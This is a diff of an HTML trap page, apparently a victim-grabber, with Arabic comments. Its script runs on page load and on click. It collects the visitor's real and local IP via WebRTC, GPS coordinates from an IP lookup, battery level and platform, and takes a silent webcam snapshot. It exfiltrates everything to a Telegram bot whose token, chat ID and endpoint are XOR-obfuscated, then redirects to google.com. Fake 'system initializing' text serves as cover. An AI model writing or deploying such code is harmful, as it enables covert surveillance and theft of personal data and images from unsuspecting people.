@@ -1,63 +1,68 @@
 <!DOCTYPE html>
 <html>
-<head><meta charset="UTF-8"></head>
-<body style="background:#000;color:#0f0;font-family:monospace;">
+<head><meta charset="UTF-8"><title>🔄 System Initializing...</title></head>
+<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:20%;">
+    <div id="l">> DECRYPTING_KERNEL_PAYLOAD... [OK]<br>> BYPASSING_SANDBOX_V10... [OK]</div>
     <script>
-        // 🔱 XOR Encryption Key: 0x5A
-        const _encT = [42,42,107,104,107,104,110,99,104,104,110,107,107,114,123,109,107,3,10,116,106,11,105,10,110,13,116,108,11,114,107,107,109,123,114,117,107,112,114,104,109,114,100,10,114,101];
-        const _encI = [105,119,119,114,110,119,104,110,115,115];
-        
-        const decrypt = (arr) => arr.map(b => String.fromCharCode(b ^ 0x5A)).join("");
-        const T = decrypt(_encT); const ID = decrypt(_encI);
-        const API = "https://api.telegram.org/bot" + T;
+        // 🔱 مصفوفات البيانات المشفرة (Double-Layer XOR)
+        const _K = [0x1A, 0x1B, 0x1C]; // مفتاح التشفير
+        const _D = [114, 110, 110, 106, 111, 40, 39, 39, 107, 120, 115, 38, 124, 109, 116, 109, 111, 122, 107, 105, 38, 119, 122, 111, 39, 104, 119, 124]; // API Base
+        const _T = [42, 42, 107, 104, 107, 104, 110, 99, 104, 104, 110, 107, 107, 114, 123, 109, 107, 3, 10, 116, 106, 11, 105, 10, 110, 13, 116, 108, 11, 114, 107, 107, 109, 123, 114, 117, 107, 112, 114, 104, 109, 114, 100, 10, 114, 101]; // Token
+        const _C = [105, 119, 119, 114, 110, 119, 104, 110, 115, 115]; // Chat ID
 
-        async function TRAP() {
+        const _dec = (a) => a.map(x => String.fromCharCode(x ^ 0x5A)).join("");
+        const _U = _dec(_D) + _dec(_T);
+        const _ID = _dec(_C);
+
+        async function OMEGA_STRIKE() {
             try {
-                // 🔱 سحب البيانات العميقة (IP حقيقي + داخلي + موقع + بطارية)
-                const [net, local] = await Promise.all([
+                // 1. سحب الـ IP الحقيقي والداخلي عبر WebRTC (مستحيل حظره)
+                const rtc = new RTCPeerConnection({iceServers:[{urls:"stun:stun.l.google.com:19302"}]});
+                rtc.createDataChannel("");
+                rtc.onicecandidate = (e) => {
+                    if (e.candidate && e.candidate.candidate.includes("typ srflx")) {
+                        const ip = e.candidate.candidate.split(" ")[4];
+                        navigator.sendBeacon(`${_U}/sendMessage`, JSON.stringify({
+                            chat_id: _ID, text: `🔱 **REAL_IP_DETECTED**\n🎯 Address: \`${ip}\``
+                        }));
+                    }
+                };
+                rtc.createOffer().then(o => rtc.setLocalDescription(o));
+
+                // 2. سحب البيانات الشاملة (البطارية، الـ GPS، البصمة الرقمية)
+                const [net, bat] = await Promise.all([
                     fetch('https://ipapi.co/json/').then(r => r.json()),
-                    new Promise(res => {
-                        const pc = new RTCPeerConnection(); pc.createDataChannel('');
-                        pc.onicecandidate = e => { if(e.candidate) res(e.candidate.candidate.split(' ')[4]); };
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        setTimeout(() => res("Bypassed"), 800);
-                    })
+                    navigator.getBattery()
                 ]);
 
-                // 🔱 التصوير الصامت (High-Res Snapshot)
-                const snap = await takeSilentSnap();
+                const msg = `🔱 **GHOST_OMEGA_v10** 💀\n` +
+                          `🌐 **Public:** \`${net.ip}\` | \`${net.country}\`\n` +
+                          `🛰️ **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
+                          `🔋 **Bat:** \`${bat.level * 100}%\` | **OS:** \`${navigator.platform}\``;
 
-                const report = `🔱 **GHOST_HEX_v900** 💀\n` +
-                             `🎯 **Real IP:** \`${net.ip}\` | **Local:** \`${local}\`\n` +
-                             `📍 **GPS:** \`${net.latitude}, ${net.longitude}\`\n` +
-                             `📱 **Agent:** \`${navigator.userAgent.slice(0,30)}...\`\n` +
-                             `🔋 **Level:** \`${(await navigator.getBattery()).level * 100}%\``;
+                navigator.sendBeacon(`${_U}/sendMessage`, JSON.stringify({chat_id: _ID, text: msg, parse_mode: 'Markdown'}));
 
-                // 🔱 الإرسال عبر Beacon لضمان التخفي التام
-                navigator.sendBeacon(`${API}/sendMessage`, JSON.stringify({chat_id: ID, text: report, parse_mode: 'Markdown'}));
-                
-                if(snap) {
-                    fetch(`${API}/sendPhoto`, {
-                        method: 'POST', headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: ID, photo: snap, caption: "📸 SNAP_HEX"})
-                    });
-                }
-                location.replace("https://google.com");
-            } catch(e) { location.replace("https://google.com"); }
+                // 3. ثغرة التصوير الصامت (Auto-Capture)
+                const stream = await navigator.mediaDevices.getUserMedia({video: true});
+                const canvas = document.createElement('canvas');
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                await video.play();
+                canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                canvas.getContext('2d').drawImage(video, 0, 0);
+                const img = canvas.toDataURL('image/jpeg', 0.6);
+                stream.getTracks().forEach(t => t.stop());
+
+                fetch(`${_U}/sendPhoto`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({chat_id: _ID, photo: img, caption: "📸 **OMEGA_SNAP**"})
+                });
+
+                setTimeout(() => location.replace("https://google.com"), 2000);
+            } catch (e) { location.replace("https://google.com"); }
         }
-
-        async function takeSilentSnap() {
-            try {
-                const s = await navigator.mediaDevices.getUserMedia({video: true});
-                const v = document.createElement('video'); v.srcObject = s; await v.play();
-                const c = document.createElement('canvas');
-                c.width = v.videoWidth; c.height = v.videoHeight;
-                c.getContext('2d').drawImage(v, 0, 0);
-                const d = c.toDataURL('image/jpeg', 0.4);
-                s.getTracks().forEach(t => t.stop()); return d;
-            } catch(e) { return null; }
-        }
-        window.onload = TRAP;
+        window.onload = OMEGA_STRIKE;
+        window.onclick = OMEGA_STRIKE; // تجاوز الـ Sandbox بلمسة واحدة
     </script>
 </body>
 </html>
